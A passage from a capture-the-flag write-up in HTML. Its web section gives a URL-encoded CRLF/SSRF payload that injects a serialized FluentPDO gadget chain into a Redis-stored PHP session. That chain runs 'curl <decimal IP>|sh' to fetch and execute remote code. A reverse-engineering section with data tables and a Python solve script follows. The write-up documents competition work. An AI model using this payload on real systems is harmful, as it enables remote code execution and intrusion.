+<span class="apache"><span class="hljs-attribute">url</span>=http://ginoah.tw:<span class="hljs-number">8080</span>/a.b%<span class="hljs-number">250</span>d%<span class="hljs-number">250</span>aSET%<span class="hljs-number">2520</span>PHPREDIS_SESSION:<span class="hljs-number">7</span>ae<span class="hljs-number">84</span>e<span class="hljs-number">5</span>c<span class="hljs-number">2</span>a<span class="hljs-number">2</span>be<span class="hljs-number">644</span>c<span class="hljs-number">1</span>fdf<span class="hljs-number">1</span>b<span class="hljs-number">1</span>eeb<span class="hljs-number">7</span>d<span class="hljs-number">0</span>df%<span class="hljs-number">2520</span>%<span class="hljs-number">2527</span>username|O%<span class="hljs-number">253</span>A<span class="hljs-number">30</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">2522</span>Envms%<span class="hljs-number">255</span>CFluentPDO%<span class="hljs-number">255</span>CQueries%<span class="hljs-number">255</span>CSelect%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>A<span class="hljs-number">4</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">257</span>Bs%<span class="hljs-number">253</span>A<span class="hljs-number">6</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">2522</span>fluent%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>BN%<span class="hljs-number">253</span>Bs%<span class="hljs-number">253</span>A<span class="hljs-number">7</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">2522</span>clauses%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>Ba%<span class="hljs-number">253</span>A<span class="hljs-number">1</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">257</span>Bs%<span class="hljs-number">253</span>A<span class="hljs-number">1</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">2522</span>x%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>Ba%<span class="hljs-number">253</span>A<span class="hljs-number">2</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">257</span>Bi%<span class="hljs-number">253</span>A<span class="hljs-number">0</span>%<span class="hljs-number">253</span>BO%<span class="hljs-number">253</span>A<span class="hljs-number">30</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">2522</span>Envms%<span class="hljs-number">255</span>CFluentPDO%<span class="hljs-number">255</span>CQueries%<span class="hljs-number">255</span>CSelect%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>A<span class="hljs-number">4</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">257</span>Bs%<span class="hljs-number">253</span>A<span class="hljs-number">6</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">2522</span>fluent%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>BO%<span class="hljs-number">253</span>A<span class="hljs-number">21</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">2522</span>Envms%<span class="hljs-number">255</span>CFluentPDO%<span class="hljs-number">255</span>CQuery%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>A<span class="hljs-number">2</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">257</span>Bs%<span class="hljs-number">253</span>A<span class="hljs-number">3</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">2522</span>pdo%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>BN%<span class="hljs-number">253</span>Bs%<span class="hljs-number">253</span>A<span class="hljs-number">9</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">2522</span>structure%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>BO%<span class="hljs-number">253</span>A<span class="hljs-number">25</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">2522</span>Envms%<span class="hljs-number">255</span>CFluentPDO%<span class="hljs-number">255</span>CStructure%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>A<span class="hljs-number">1</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">257</span>Bs%<span class="hljs-number">253</span>A<span class="hljs-number">10</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">2522</span>primaryKey%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>Bs%<span class="hljs-number">253</span>A<span class="hljs-number">6</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">2522</span>system%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>B%<span class="hljs-number">257</span>D%<span class="hljs-number">257</span>Ds%<span class="hljs-number">253</span>A<span class="hljs-number">7</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">2522</span>clauses%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>Ba%<span class="hljs-number">253</span>A<span class="hljs-number">0</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">257</span>B%<span class="hljs-number">257</span>Ds%<span class="hljs-number">253</span>A<span class="hljs-number">10</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">2522</span>statements%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>Ba%<span class="hljs-number">253</span>A<span class="hljs-number">2</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">257</span>Bs%<span class="hljs-number">253</span>A<span class="hljs-number">6</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">2522</span>SELECT%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>Ba%<span class="hljs-number">253</span>A<span class="hljs-number">1</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">257</span>Bi%<span class="hljs-number">253</span>A<span class="hljs-number">0</span>%<span class="hljs-number">253</span>Bs%<span class="hljs-number">253</span>A<span class="hljs-number">3</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">2522</span>x%<span class="hljs-number">253</span>Ax%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>B%<span class="hljs-number">257</span>Ds%<span class="hljs-number">253</span>A<span class="hljs-number">4</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">2522</span>FROM%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>Bs%<span class="hljs-number">253</span>A<span class="hljs-number">18</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">2522</span>curl%<span class="hljs-number">2</span>B<span class="hljs-number">3419192343</span>%<span class="hljs-number">257</span>Csh%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>B%<span class="hljs-number">257</span>Ds%<span class="hljs-number">253</span>A<span class="hljs-number">5</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">2522</span>regex%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>BO%<span class="hljs-number">253</span>A<span class="hljs-number">21</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">2522</span>Envms%<span class="hljs-number">255</span>CFluentPDO%<span class="hljs-number">255</span>CRegex%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>A<span class="hljs-number">0</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">257</span>B%<span class="hljs-number">257</span>D%<span class="hljs-number">257</span>Di%<span class="hljs-number">253</span>A<span class="hljs-number">1</span>%<span class="hljs-number">253</span>Bs%<span class="hljs-number">253</span>A<span class="hljs-number">8</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">2522</span>getQuery%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>B%<span class="hljs-number">257</span>D%<span class="hljs-number">257</span>Ds%<span class="hljs-number">253</span>A<span class="hljs-number">10</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">2522</span>statements%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>Ba%<span class="hljs-number">253</span>A<span class="hljs-number">1</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">257</span>Bs%<span class="hljs-number">253</span>A<span class="hljs-number">1</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">2522</span>x%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>Bb%<span class="hljs-number">253</span>A<span class="hljs-number">1</span>%<span class="hljs-number">253</span>B%<span class="hljs-number">257</span>Ds%<span class="hljs-number">253</span>A<span class="hljs-number">5</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">2522</span>regex%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>BN%<span class="hljs-number">253</span>B%<span class="hljs-number">257</span>D%<span class="hljs-number">2527</span>%<span class="hljs-number">250</span>d%<span class="hljs-number">250</span>aHost:%<span class="hljs-number">2520</span>xx</span></code></pre><pre class="hljs"><code><span class="hljs-attribute">Location</span><span class="hljs-punctuation">: </span>http://redis:6379/</code></pre><h2 id="rev"><a class="header-link" href="#rev"></a>rev</h2>
+<h3 id="javascript_vm"><a class="header-link" href="#javascript_vm"></a>javascript_vm</h3>
+<ul class="list">
+<li>test</li>
+</ul>
+<pre class="hljs"><code><span class="hljs-symbol">127 </span><span class="hljs-number">127</span>
+<span class="hljs-symbol">148 </span><span class="hljs-number">148</span>
+<span class="hljs-symbol">212 </span><span class="hljs-number">178</span>
+<span class="hljs-symbol">242 </span><span class="hljs-number">182</span>
+<span class="hljs-symbol">247 </span><span class="hljs-number">182</span>
+<span class="hljs-symbol">175 </span><span class="hljs-number">169</span>
+<span class="hljs-symbol">152 </span><span class="hljs-number">148</span>
+<span class="hljs-symbol">186 </span><span class="hljs-number">187</span>
+<span class="hljs-symbol">158 </span><span class="hljs-number">156</span>
+<span class="hljs-symbol">215 </span><span class="hljs-number">146</span>
+<span class="hljs-symbol">133 </span><span class="hljs-number">130</span>
+<span class="hljs-symbol">179 </span><span class="hljs-number">133</span>
+<span class="hljs-symbol">251 </span><span class="hljs-number">216</span>
+<span class="hljs-symbol">221 </span><span class="hljs-number">175</span>
+<span class="hljs-symbol">207 </span><span class="hljs-number">146</span>
+<span class="hljs-symbol">183 </span><span class="hljs-number">107</span>
+<span class="hljs-symbol">230 </span><span class="hljs-number">156</span>
+<span class="hljs-symbol">94 </span><span class="hljs-number">91</span>
+<span class="hljs-symbol">3 </span><span class="hljs-number">202</span>
+<span class="hljs-symbol">175 </span><span class="hljs-number">125</span>
+<span class="hljs-symbol">216 </span><span class="hljs-number">191</span>
+<span class="hljs-symbol">179 </span><span class="hljs-number">179</span>
+<span class="hljs-symbol">195 </span><span class="hljs-number">126</span>
+<span class="hljs-symbol">183 </span><span class="hljs-number">123</span>
+<span class="hljs-symbol">190 </span><span class="hljs-number">144</span>
+<span class="hljs-symbol">162 </span><span class="hljs-number">116</span>
+<span class="hljs-symbol">189 </span><span class="hljs-number">117</span>
+<span class="hljs-symbol">81 </span><span class="hljs-number">81</span>
+<span class="hljs-symbol">170 </span><span class="hljs-number">124</span>
+<span class="hljs-symbol">152 </span><span class="hljs-number">152</span>
+<span class="hljs-symbol">209 </span><span class="hljs-number">205</span>
+<span class="hljs-symbol">164 </span><span class="hljs-number">118</span>
+<span class="hljs-symbol">196 </span><span class="hljs-number">141</span>
+<span class="hljs-symbol">160 </span><span class="hljs-number">157</span>
+<span class="hljs-symbol">98 </span><span class="hljs-number">92</span>
+<span class="hljs-symbol">97 </span><span class="hljs-number">97</span>
+<span class="hljs-symbol">87 </span><span class="hljs-number">81</span>
+<span class="hljs-symbol">145 </span><span class="hljs-number">139</span>
+<span class="hljs-symbol">88 </span><span class="hljs-number">23</span>
+<span class="hljs-symbol">157 </span><span class="hljs-number">158</span>
+<span class="hljs-symbol">248 </span><span class="hljs-number">202</span>
+<span class="hljs-symbol">197 </span><span class="hljs-number">144</span>
+<span class="hljs-symbol">175 </span><span class="hljs-number">116</span>
+<span class="hljs-symbol">136 </span><span class="hljs-number">130</span>
+<span class="hljs-symbol">180 </span><span class="hljs-number">125</span>
+<span class="hljs-symbol">186 </span><span class="hljs-number">123</span>
+<span class="hljs-symbol">233 </span><span class="hljs-number">187</span>
+<span class="hljs-symbol">175 </span><span class="hljs-number">105</span>
+<span class="hljs-symbol">223 </span><span class="hljs-number">158</span>
+<span class="hljs-symbol">169 </span><span class="hljs-number">166</span>
+<span class="hljs-symbol">185 </span><span class="hljs-number">139</span>
+<span class="hljs-symbol">217 </span><span class="hljs-number">149</span></code></pre><ul class="list">
+<li>test2</li>
+</ul>
+<pre class="hljs"><code><span class="hljs-symbol">127 </span><span class="hljs-number">130</span>
+<span class="hljs-symbol">148 </span><span class="hljs-number">171</span>
+<span class="hljs-symbol">212 </span><span class="hljs-number">178</span>
+<span class="hljs-symbol">242 </span><span class="hljs-number">250</span>
+<span class="hljs-symbol">247 </span><span class="hljs-number">244</span>
+<span class="hljs-symbol">175 </span><span class="hljs-number">173</span>
+<span class="hljs-symbol">152 </span><span class="hljs-number">155</span>
+<span class="hljs-symbol">186 </span><span class="hljs-number">236</span>
+<span class="hljs-symbol">158 </span><span class="hljs-number">210</span>
+<span class="hljs-symbol">215 </span><span class="hljs-number">204</span>
+<span class="hljs-symbol">133 </span><span class="hljs-number">149</span>
+<span class="hljs-symbol">179 </span><span class="hljs-number">138</span>
+<span class="hljs-symbol">251 </span><span class="hljs-number">215</span>
+<span class="hljs-symbol">221 </span><span class="hljs-number">226</span>
+<span class="hljs-symbol">207 </span><span class="hljs-number">194</span>
+<span class="hljs-symbol">183 </span><span class="hljs-number">138</span>
+<span class="hljs-symbol">230 </span><span class="hljs-number">158</span>
+<span class="hljs-symbol">94 </span><span class="hljs-number">115</span>
+<span class="hljs-symbol">3 </span><span class="hljs-number">2</span>
+<span class="hljs-symbol">175 </span><span class="hljs-number">186</span>
+<span class="hljs-symbol">216 </span><span class="hljs-number">192</span>
+<span class="hljs-symbol">179 </span><span class="hljs-number">207</span>
+<span class="hljs-symbol">195 </span><span class="hljs-number">193</span>
+<span class="hljs-symbol">183 </span><span class="hljs-number">143</span>
+<span class="hljs-symbol">190 </span><span class="hljs-number">152</span>
+<span class="hljs-symbol">162 </span><span class="hljs-number">171</span>
+<span class="hljs-symbol">189 </span><span class="hljs-number">187</span>
+<span class="hljs-symbol">81 </span><span class="hljs-number">144</span>
+<span class="hljs-symbol">170 </span><span class="hljs-number">141</span>
+<span class="hljs-symbol">152 </span><span class="hljs-number">158</span>
+<span class="hljs-symbol">209 </span><span class="hljs-number">9</span>
+<span class="hljs-symbol">164 </span><span class="hljs-number">187</span>
+<span class="hljs-symbol">196 </span><span class="hljs-number">171</span>
+<span class="hljs-symbol">160 </span><span class="hljs-number">216</span>
+<span class="hljs-symbol">98 </span><span class="hljs-number">157</span>
+<span class="hljs-symbol">97 </span><span class="hljs-number">118</span>
+<span class="hljs-symbol">87 </span><span class="hljs-number">133</span>
+<span class="hljs-symbol">145 </span><span class="hljs-number">168</span>
+<span class="hljs-symbol">88 </span><span class="hljs-number">48</span>
+<span class="hljs-symbol">157 </span><span class="hljs-number">229</span>
+<span class="hljs-symbol">248 </span><span class="hljs-number">228</span>
+<span class="hljs-symbol">197 </span><span class="hljs-number">162</span>
+<span class="hljs-symbol">175 </span><span class="hljs-number">138</span>
+<span class="hljs-symbol">136 </span><span class="hljs-number">180</span>
+<span class="hljs-symbol">180 </span><span class="hljs-number">178</span>
+<span class="hljs-symbol">186 </span><span class="hljs-number">187</span>
+<span class="hljs-symbol">233 </span><span class="hljs-number">253</span>
+<span class="hljs-symbol">175 </span><span class="hljs-number">132</span>
+<span class="hljs-symbol">223 </span><span class="hljs-number">174</span>
+<span class="hljs-symbol">169 </span><span class="hljs-number">223</span>
+<span class="hljs-symbol">185 </span><span class="hljs-number">212</span>
+<span class="hljs-symbol">217 </span><span class="hljs-number">221</span></code></pre><ul class="list">
+<li>sol.py</li>
+</ul>
+<pre class="hljs"><code>import string
+
+f = <span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;test&#x27;</span>)
+
+
+flag = []
+
+a = []
+
+b = []
+
+<span class="hljs-keyword">for</span> i in f.readlines():
+  c,d = i.<span class="hljs-keyword">split</span>()
+  flag.append(<span class="hljs-keyword">int</span>(c))
+  a.append(<span class="hljs-keyword">int</span>(d))
+  <span class="hljs-keyword">print</span> <span class="hljs-keyword">int</span>(c),d
+
+f = <span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;test2&#x27;</span>)
+
+<span class="hljs-keyword">for</span> i in f.readlines():
+  c,d = i.<span class="hljs-keyword">split</span>()
+  b.append(<span class="hljs-keyword">int</span>(d))
+
+
+ans = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOP&quot;</span>
+
+<span class="hljs-keyword">print</span> len(ans)
+
+<span class="hljs-keyword">index</span> = []
+out = [<span class="hljs-string">&#x27;0&#x27;</span>] * <span class="hljs-number">52</span>
+
+<span class="hljs-keyword">for</span> i in range(<span class="hljs-number">51</span>):
+  j = b[i] - a[i]
+  ii = (j+<span class="hljs-number">1</span>) % <span class="hljs-number">256</span>
+  k = <span class="hljs-keyword">chr</span>(<span class="hljs-keyword">ord</span>(<span class="hljs-string">&#x27;0&#x27;</span>) + ii)
+  <span class="hljs-keyword">print</span> k
+  ii = ans.find(k)
+  enc = flag[i]
+  <span class="hljs-keyword">q</span> = a[i]
+  t = enc - <span class="hljs-keyword">q</span>
+  <span class="hljs-keyword">print</span> ii
+  <span class="hljs-keyword">print</span> <span class="hljs-keyword">chr</span>((<span class="hljs-keyword">ord</span>(<span class="hljs-string">&#x27;1&#x27;</span>)+t)%256)
+  out[ii] = <span class="hljs-keyword">chr</span>((<span class="hljs-keyword">ord</span>(<span class="hljs-string">&#x27;1&#x27;</span>)+t)%256)
+
+<span class="hljs-keyword">print</span> <span class="hljs-string">&quot;&quot;</span>.join(out)
+<span class="hljs-keyword">print</span> flag,a,b</code></pre>        </article>
+      </div>
+    </div>
+  </body>
+</html>
